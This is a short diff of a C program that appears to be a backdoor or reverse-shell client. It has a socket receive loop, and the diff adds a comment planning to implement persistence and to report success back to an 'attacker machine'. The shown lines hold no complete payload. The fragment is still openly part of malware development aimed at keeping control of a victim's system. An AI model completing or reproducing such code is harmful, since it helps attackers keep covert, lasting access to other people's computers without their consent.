@@ -118,6 +118,9 @@ int main()
         {
             goto jump;
         }
+
+        //Want to implement a persistance successful command to attacker machine and want to jump into the main process after the persist execution.
+            
         else
         {   
             //'recv' function takes client socket and response and size of the reponse and flag.
